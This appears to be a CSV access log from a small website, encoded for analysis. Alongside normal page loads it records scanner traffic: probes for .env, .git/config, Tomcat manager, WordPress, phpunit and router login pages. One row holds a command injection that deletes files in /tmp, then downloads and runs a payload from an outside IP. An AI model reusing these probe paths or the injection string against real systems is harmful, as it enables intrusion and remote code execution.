Host,Date,Time,Method,Endpoint,Protocol,Status Code,Content Size,No of Requests
179570259,14-Feb-23,13:30:21,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,0,9028,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,0,2406,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,0,15022,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,0,44342,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,0,35445,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/aos/aos.js,HTTP/1.1,0,14690,129
179570259,14-Feb-23,13:30:21,4,/assets/js/main.js,HTTP/1.1,0,6330,129
179570259,14-Feb-23,13:30:21,4,/hero.html,HTTP/1.1,0,6789,129
179570259,14-Feb-23,13:30:21,4,/about.html,HTTP/1.1,0,2729,129
179570259,14-Feb-23,13:30:21,4,/faq.html,HTTP/1.1,0,4212,129
179570259,14-Feb-23,13:30:21,4,/contact.html,HTTP/1.1,0,5487,129
179570259,14-Feb-23,13:30:21,4,/images/api_br.png,HTTP/1.1,0,1629,129
179570259,14-Feb-23,13:30:21,4,/images/api_y.png,HTTP/1.1,0,1636,129
179570259,14-Feb-23,13:30:21,4,/images/api_g.png,HTTP/1.1,0,1588,129
179570259,14-Feb-23,13:30:21,4,/images/api_p.png,HTTP/1.1,0,1642,129
179570259,14-Feb-23,13:30:21,4,/images/India_Map.png,HTTP/1.1,0,153088,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/boxicons/fonts/boxicons.woff2,HTTP/1.1,0,93260,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/remixicon/remixicon.woff2?t=1590207869815,HTTP/1.1,0,125268,129
179570259,14-Feb-23,13:30:21,4,/images/image1.jpg,HTTP/1.1,0,442343,129
179570259,14-Feb-23,13:30:21,4,/assets/vendor/icofont/fonts/icofont.woff2,HTTP/1.1,0,537868,129
179570259,14-Feb-23,13:30:25,4,/,HTTP/1.1,0,5952,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/boxicons/css/boxicons.min.css,HTTP/1.1,0,63235,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/owl.carousel/assets/owl.carousel.min.css,HTTP/1.1,0,3351,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/venobox/venobox.css,HTTP/1.1,0,20309,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/icofont/icofont.min.css,HTTP/1.1,0,92208,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/remixicon/remixicon.css,HTTP/1.1,0,110438,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/bootstrap/css/bootstrap.min.css,HTTP/1.1,0,161409,129
179570259,14-Feb-23,13:30:25,4,/assets/css/style.css,HTTP/1.1,0,35417,129
179570259,14-Feb-23,13:30:25,4,/js/multipage.js,HTTP/1.1,0,956,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/aos/aos.css,HTTP/1.1,0,26053,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,0,84378,129
179570259,14-Feb-23,13:30:25,4,/js/jquery.js,HTTP/1.1,0,106323,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,0,89476,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,0,2532,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/php-email-form/validate.js,HTTP/1.1,0,5020,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,0,9028,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,0,2406,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,0,15022,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,0,44342,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,0,35445,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/aos/aos.js,HTTP/1.1,0,14690,129
179570259,14-Feb-23,13:30:25,4,/assets/js/main.js,HTTP/1.1,0,6330,129
179570259,14-Feb-23,13:30:25,4,/hero.html,HTTP/1.1,0,6789,129
179570259,14-Feb-23,13:30:25,4,/faq.html,HTTP/1.1,0,4212,129
179570259,14-Feb-23,13:30:25,4,/about.html,HTTP/1.1,0,2729,129
179570259,14-Feb-23,13:30:25,4,/contact.html,HTTP/1.1,0,5487,129
179570259,14-Feb-23,13:30:25,4,/images/api_br.png,HTTP/1.1,0,1629,129
179570259,14-Feb-23,13:30:25,4,/images/api_y.png,HTTP/1.1,0,1636,129
179570259,14-Feb-23,13:30:25,4,/images/api_g.png,HTTP/1.1,0,1588,129
179570259,14-Feb-23,13:30:25,4,/images/api_p.png,HTTP/1.1,0,1642,129
179570259,14-Feb-23,13:30:25,4,/images/India_Map.png,HTTP/1.1,0,153088,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/remixicon/remixicon.woff2?t=1590207869815,HTTP/1.1,0,125268,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/boxicons/fonts/boxicons.woff2,HTTP/1.1,0,93260,129
179570259,14-Feb-23,13:30:25,4,/images/image1.jpg,HTTP/1.1,0,442343,129
179570259,14-Feb-23,13:30:25,4,/assets/vendor/icofont/fonts/icofont.woff2,HTTP/1.1,0,537868,129
2682217158,14-Feb-23,13:35:08,4,/,HTTP/1.1,0,5952,2
2372012600,14-Feb-23,13:57:39,4,/,HTTP/1.1,0,5952,18
1509467641,14-Feb-23,14:06:42,11,mstshash=Administr,,6,150,11
1509467015,14-Feb-23,15:12:22,0,"""-",,6,150,1
3116218090,14-Feb-23,15:26:20,4,/rFg=,HTTP/1.1,6,150,4
1519889258,14-Feb-23,15:46:30,3,checkip.amazonaws.com:443,HTTP/1.1,6,150,48
1519889258,14-Feb-23,15:46:30,12,L0\x00,,6,150,48
1519889258,14-Feb-23,15:46:30,4,http://checkip.amazonaws.com?Z72549204420Q1,HTTP/1.1,6,248,48
1519889258,14-Feb-23,15:46:30,0,"""-",,6,150,48
2372012600,14-Feb-23,15:50:58,4,/,HTTP/1.1,0,5952,18
3337295911,14-Feb-23,15:58:39,4,/,HTTP/1.1,0,5952,1
3280283709,14-Feb-23,16:33:11,4,/explore,HTTP/1.1,7,548,1
179570415,14-Feb-23,17:30:33,4,/,HTTP/1.1,0,5952,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/venobox/venobox.css,HTTP/1.1,0,20309,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/icofont/icofont.min.css,HTTP/1.1,0,92208,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/owl.carousel/assets/owl.carousel.min.css,HTTP/1.1,0,3351,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/bootstrap/css/bootstrap.min.css,HTTP/1.1,0,161409,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/boxicons/css/boxicons.min.css,HTTP/1.1,0,63235,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/aos/aos.css,HTTP/1.1,0,26053,36
179570415,14-Feb-23,17:30:33,4,/js/jquery.js,HTTP/1.1,0,106323,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/remixicon/remixicon.css,HTTP/1.1,0,110438,36
179570415,14-Feb-23,17:30:33,4,/assets/css/style.css,HTTP/1.1,0,35417,36
179570415,14-Feb-23,17:30:33,4,/js/multipage.js,HTTP/1.1,0,956,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,0,2532,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,0,84378,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/php-email-form/validate.js,HTTP/1.1,0,5020,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,0,9028,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,0,2406,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,0,89476,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,0,15022,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,0,44342,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,0,35445,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/aos/aos.js,HTTP/1.1,0,14690,36
179570415,14-Feb-23,17:30:33,4,/assets/js/main.js,HTTP/1.1,0,6330,36
179570415,14-Feb-23,17:30:33,4,/hero.html,HTTP/1.1,0,6789,36
179570415,14-Feb-23,17:30:33,4,/about.html,HTTP/1.1,0,2729,36
179570415,14-Feb-23,17:30:33,4,/faq.html,HTTP/1.1,0,4212,36
179570415,14-Feb-23,17:30:33,4,/contact.html,HTTP/1.1,0,5487,36
179570415,14-Feb-23,17:30:33,4,/images/api_br.png,HTTP/1.1,0,1629,36
179570415,14-Feb-23,17:30:33,4,/images/api_g.png,HTTP/1.1,0,1588,36
179570415,14-Feb-23,17:30:33,4,/images/api_y.png,HTTP/1.1,0,1636,36
179570415,14-Feb-23,17:30:33,4,/images/api_p.png,HTTP/1.1,0,1642,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/icofont/fonts/icofont.woff2,HTTP/1.1,0,537868,36
179570415,14-Feb-23,17:30:33,4,/images/India_Map.png,HTTP/1.1,0,153088,36
179570415,14-Feb-23,17:30:33,4,/images/image1.jpg,HTTP/1.1,0,442343,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/boxicons/fonts/boxicons.woff2,HTTP/1.1,0,93260,36
179570415,14-Feb-23,17:30:33,4,/assets/vendor/remixicon/remixicon.woff2?t=1590207869815,HTTP/1.1,0,125268,36
179570415,14-Feb-23,17:30:34,4,/assets/img/favicon.png,HTTP/1.1,0,491,36
856671222,14-Feb-23,17:46:57,4,/,HTTP/1.1,0,5952,1
2680938510,14-Feb-23,18:40:58,4,/manager/text/list,HTTP/1.1,6,248,1
2807990901,14-Feb-23,19:26:10,4,/,HTTP/1.1,0,5952,5
2727247324,14-Feb-23,19:26:12,4,/,HTTP/1.1,0,5952,15
2807990901,14-Feb-23,19:26:12,8,*,HTTP/2.0,6,150,5
2807990901,14-Feb-23,19:26:14,4,/assets/img/favicon.png,HTTP/1.1,0,491,5
2727247324,14-Feb-23,19:26:14,8,*,HTTP/2.0,6,150,15
2727247324,14-Feb-23,19:26:15,4,/assets/img/favicon.png,HTTP/1.1,0,491,15
2727247324,14-Feb-23,19:26:16,4,/assets/img/apple-touch-icon.png,HTTP/1.1,0,1738,15
2727247324,14-Feb-23,19:26:17,4,/favicon.ico,HTTP/1.1,7,146,15
2807990901,14-Feb-23,19:26:17,4,/assets/img/apple-touch-icon.png,HTTP/1.1,0,1738,5
2807990901,14-Feb-23,19:26:18,4,/favicon.ico,HTTP/1.1,7,146,5
3334959972,14-Feb-23,19:29:36,4,/manager/html,HTTP/1.1,6,248,2
3453099799,14-Feb-23,19:45:03,4,/,HTTP/1.1,0,5952,2
2319769669,14-Feb-23,19:47:29,4,/manager/html,HTTP/1.1,7,548,3
2372012839,14-Feb-23,19:49:23,4,/,HTTP/1.1,0,5952,2
883396698,14-Feb-23,20:15:13,4,/,HTTP/1.1,0,5952,19
575430711,14-Feb-23,20:35:01,4,/,HTTP/1.1,0,5952,2
1123632735,14-Feb-23,20:39:16,4,/robots.txt,HTTP/1.1,7,146,6
1123632707,14-Feb-23,20:39:17,4,/,HTTP/1.1,0,5952,2
1123632735,14-Feb-23,20:39:24,4,/assets/vendor/bootstrap/css/bootstrap.min.css,HTTP/1.1,0,161409,6
1123632735,14-Feb-23,20:39:24,4,/assets/vendor/remixicon/remixicon.css,HTTP/1.1,0,110438,6
1123632735,14-Feb-23,20:39:25,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,0,15022,6
1123632735,14-Feb-23,20:39:26,4,/assets/vendor/owl.carousel/assets/owl.carousel.min.css,HTTP/1.1,0,3351,6
1123632731,14-Feb-23,20:39:28,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,0,89476,8
1123632731,14-Feb-23,20:39:29,4,/assets/vendor/aos/aos.js,HTTP/1.1,0,14690,8
1123632731,14-Feb-23,20:39:30,4,/js/multipage.js,HTTP/1.1,0,956,8
1123632731,14-Feb-23,20:39:30,4,/assets/vendor/php-email-form/validate.js,HTTP/1.1,0,5020,8
1123632731,14-Feb-23,20:39:31,4,/assets/vendor/venobox/venobox.css,HTTP/1.1,0,20309,8
1123632731,14-Feb-23,20:39:32,4,/assets/css/style.css,HTTP/1.1,0,35417,8
1123632731,14-Feb-23,20:39:33,4,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,0,2532,8
1123632731,14-Feb-23,20:39:35,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,0,44342,8
1123632735,14-Feb-23,21:01:45,4,/documentation.html,HTTP/1.1,0,548,6
1123632707,14-Feb-23,21:03:38,4,/swagger-api-spec.yaml,HTTP/1.1,0,62298,2
2680892503,14-Feb-23,21:17:27,0,"""-",,6,150,6
2680892503,14-Feb-23,21:17:29,4,/ab2g,HTTP/1.1,7,146,6
2680892503,14-Feb-23,21:17:31,4,/ab2h,HTTP/1.1,7,146,6
2680892503,14-Feb-23,21:17:40,4,/,HTTP/1.1,0,5952,6
2680892503,14-Feb-23,21:17:41,4,/,HTTP/1.1,6,650,6
2680892503,14-Feb-23,21:17:41,4,/private/api/v1/service/premaster,HTTP/1.1,6,650,6
402351690,14-Feb-23,21:17:43,4,/,HTTP/1.1,0,5952,5
676177853,14-Feb-23,21:27:18,4,/helppage.html,HTTP/1.1,0,6398,7
1844273588,14-Feb-23,21:37:43,4,/.env,HTTP/1.1,6,650,73
1844273588,14-Feb-23,21:37:43,4,/.env,HTTP/1.1,7,548,73
402351690,14-Feb-23,22:15:32,4,/,HTTP/1.1,0,5952,5
1123085421,14-Feb-23,22:29:05,4,/,HTTP/1.1,0,5952,4
2148435626,14-Feb-23,22:56:55,4,/,HTTP/1.1,0,5952,5
3079201056,14-Feb-23,23:23:16,4,/,HTTP/1.1,0,5952,198
3079201056,14-Feb-23,23:24:32,4,/assets/img/favicon.png,HTTP/1.1,0,491,198
3079201056,14-Feb-23,23:24:35,4,/robots.txt,HTTP/1.1,7,548,198
3079201056,14-Feb-23,23:24:55,4,/js/jquery.js,HTTP/1.1,0,65081,198
3079201056,14-Feb-23,23:24:58,4,/js/multipage.js,HTTP/1.1,0,956,198
3079201056,14-Feb-23,23:25:19,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,0,65082,198
3079201056,14-Feb-23,23:25:39,4,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,0,48698,198
3079201056,14-Feb-23,23:25:41,4,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,0,2532,198
3079201056,14-Feb-23,23:25:50,4,/assets/vendor/php-email-form/validate.js,HTTP/1.1,0,5020,198
3079201056,14-Feb-23,23:25:57,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,0,9028,198
3079201056,14-Feb-23,23:26:19,4,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,0,2406,198
3079201056,14-Feb-23,23:26:26,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,0,15022,198
3079201056,14-Feb-23,23:26:33,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,0,44342,198
3079201056,14-Feb-23,23:26:42,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,0,35445,198
3079201056,14-Feb-23,23:27:05,4,/assets/vendor/aos/aos.js,HTTP/1.1,0,14690,198
3571475053,14-Feb-23,23:27:13,4,/wp-login.php,HTTP/1.1,7,146,2
3079201056,14-Feb-23,23:27:23,4,/assets/js/main.js,HTTP/1.1,0,6330,198
1123085421,14-Feb-23,23:30:21,4,/,HTTP/1.1,0,5952,4
3334956935,15-Feb-23,00:02:02,4,/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f,HTTP/1.1,7,146,1
2471374841,15-Feb-23,00:30:15,4,/_ignition/health-check/,HTTP/1.1,7,548,6
2471374841,15-Feb-23,00:30:18,4,/public/_ignition/health-check/,HTTP/1.1,7,548,6
2471374841,15-Feb-23,00:30:21,4,/wp-includes/wlwmanifest.xml,HTTP/1.1,7,548,6
1783332564,15-Feb-23,00:41:11,4,/,HTTP/1.1,0,5952,1
2556019923,15-Feb-23,01:55:03,4,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,7,548,84
3335744868,15-Feb-23,02:27:51,4,/,HTTP/1.1,0,5952,1
2990463094,15-Feb-23,02:46:13,4,/aaa9,HTTP/1.1,6,248,2
2990463094,15-Feb-23,02:46:14,4,/aab8,HTTP/1.1,6,248,2
1509467641,15-Feb-23,02:54:33,11,mstshash=Administr,,6,150,11
1020873542,15-Feb-23,02:56:40,0,"""-",,6,150,11
3245749698,15-Feb-23,03:26:53,4,/,HTTP/1.1,0,5952,5
2556019923,15-Feb-23,03:27:55,4,/solr/admin/info/system?wt=json,HTTP/1.1,7,548,84
3562523896,20-Feb-23,03:36:55,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,03:36:55,0,"""-""","""-",6,0,132
3240141471,20-Feb-23,03:37:57,4,/,HTTP/1.1,3,169,80
3562523896,20-Feb-23,03:42:05,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,03:42:05,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,04:11:26,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,04:11:26,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,05:03:23,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,05:03:23,0,"""-""","""-",6,0,132
1509467126,20-Feb-23,05:12:11,0,"""-""","""-",6,157,2
3562523896,20-Feb-23,05:17:56,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,05:17:56,0,"""-""","""-",6,0,132
1835192372,20-Feb-23,05:19:03,7,/boaform/admin/formLogin,HTTP/1.1,3,169,16
1835192372,20-Feb-23,05:19:03,0,"""-""","""-",6,0,16
3562523896,20-Feb-23,05:26:31,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,05:26:31,0,"""-""","""-",6,0,132
3165039546,20-Feb-23,05:29:36,7,/boaform/admin/formLogin,HTTP/1.1,3,169,6
3165039546,20-Feb-23,05:29:37,0,"""-""","""-",6,0,6
2680938511,20-Feb-23,06:08:04,4,/portal/redlion,HTTP/1.1,3,169,1
3240763672,20-Feb-23,06:11:49,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,06:11:49,0,"""-""","""-",6,0,197
883396664,20-Feb-23,06:22:20,4,/robots.txt,HTTP/1.1,3,169,2
3475901711,20-Feb-23,06:22:28,4,/,HTTP/1.1,3,169,11
3240763672,20-Feb-23,06:24:07,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,06:24:07,0,"""-""","""-",6,0,197
2733872141,20-Feb-23,06:25:28,4,/actuator/health,HTTP/1.1,3,169,1
3240763672,20-Feb-23,06:28:58,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,06:28:58,0,"""-""","""-",6,0,197
3562523896,20-Feb-23,06:35:06,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,06:35:06,0,"""-""","""-",6,0,132
3237077010,20-Feb-23,06:47:15,4,/hudson,HTTP/1.1,3,169,1
3240141471,20-Feb-23,06:49:20,4,/,HTTP/1.1,3,169,80
3562523896,20-Feb-23,06:51:43,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,06:51:43,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,06:54:20,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,06:54:20,0,"""-""","""-",6,0,132
993076494,20-Feb-23,06:56:05,4,/shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws,HTTP/1.1,3,169,1
3240141471,20-Feb-23,07:03:43,4,/,HTTP/1.1,3,169,80
3562523896,20-Feb-23,07:03:47,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,07:03:47,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,07:11:22,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,07:11:23,0,"""-""","""-",6,0,132
1191634967,20-Feb-23,07:12:59,4,/,HTTP/1.1,3,169,1
3562523896,20-Feb-23,07:15:32,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,07:15:32,0,"""-""","""-",6,0,132
3240763672,20-Feb-23,07:15:39,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,07:15:39,0,"""-""","""-",6,0,197
3562523896,20-Feb-23,07:24:22,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,07:24:23,0,"""-""","""-",6,0,132
1583758602,20-Feb-23,07:34:06,4,/,HTTP/1.1,3,169,50
2415145644,20-Feb-23,07:36:33,4,http://ip-api.com/json/,HTTP/1.1,3,169,62
2415145644,20-Feb-23,07:36:34,3,ip-api.com:443,HTTP/1.1,6,157,62
3562523896,20-Feb-23,07:38:16,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,07:38:16,0,"""-""","""-",6,0,132
3245749698,20-Feb-23,07:41:57,4,/,HTTP/1.1,3,169,5
2671865848,20-Feb-23,07:43:41,4,/,HTTP/1.0,3,169,4
3240763672,20-Feb-23,07:46:11,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,07:46:11,0,"""-""","""-",6,0,197
3240763672,20-Feb-23,08:01:42,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,08:01:42,0,"""-""","""-",6,0,197
623701735,20-Feb-23,08:16:10,7,/boaform/admin/formLogin,HTTP/1.1,3,169,20
623701735,20-Feb-23,08:16:10,0,"""-""","""-",6,0,20
3119963234,20-Feb-23,08:31:29,4,/,HTTP/1.1,3,169,45
3562523896,20-Feb-23,08:59:22,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,08:59:22,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:00:51,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:00:51,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:06:33,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:06:33,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:09:00,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:09:00,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:12:17,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:12:17,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:16:45,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:16:45,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:18:59,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:19:00,0,"""-""","""-",6,0,132
1476083723,20-Feb-23,09:31:58,13,\x00\x00\x00\x00\x00\x00\x00\xC0\x0C\x92\x06\xFB\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x92\x06\xFB\x01\x00\x00\xFE\xFF\xFF\xFF\x01,6,157,6
1754805453,20-Feb-23,09:37:28,4,/,HTTP/1.0,3,169,1
3562523896,20-Feb-23,09:43:19,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:43:19,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,09:47:12,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:47:12,0,"""-""","""-",6,0,132
754101383,20-Feb-23,09:52:27,4,/,HTTP/1.1,3,169,1
3562523896,20-Feb-23,09:53:09,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,09:53:09,0,"""-""","""-",6,0,132
3118498007,20-Feb-23,10:00:20,4,/,HTTP/1.1,3,169,2
3562523896,20-Feb-23,10:02:51,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:02:51,0,"""-""","""-",6,0,132
3165039546,20-Feb-23,10:07:56,7,/boaform/admin/formLogin,HTTP/1.1,3,169,6
3165039546,20-Feb-23,10:07:56,0,"""-""","""-",6,0,6
3562523896,20-Feb-23,10:11:02,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:11:02,0,"""-""","""-",6,0,132
1551247212,20-Feb-23,10:12:30,4,/.git/config,HTTP/1.1,3,169,2
3562523896,20-Feb-23,10:19:23,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:19:23,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,10:33:19,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:33:19,0,"""-""","""-",6,0,132
1607985713,20-Feb-23,10:37:31,4,/,HTTP/1.1,3,169,1
3562523896,20-Feb-23,10:39:33,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:39:33,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,10:44:40,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:44:40,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,10:47:26,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:47:27,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,10:52:07,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,10:52:07,0,"""-""","""-",6,0,132
3240763672,20-Feb-23,10:59:17,7,/boaform/admin/formLogin,HTTP/1.1,3,169,197
3240763672,20-Feb-23,10:59:17,0,"""-""","""-",6,0,197
1506830226,20-Feb-23,11:00:35,4,http://ip-api.com/json/,HTTP/1.1,3,169,4
1506830226,20-Feb-23,11:00:35,3,ip-api.com:443,HTTP/1.1,6,157,4
3562523896,20-Feb-23,11:02:42,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,11:02:42,0,"""-""","""-",6,0,132
3562523896,20-Feb-23,11:05:26,7,/boaform/admin/formLogin,HTTP/1.1,3,169,132
3562523896,20-Feb-23,11:05:27,0,"""-""","""-",6,0,132
1551247186,20-Feb-23,11:08:49,4,/,HTTP/1.1,3,169,16
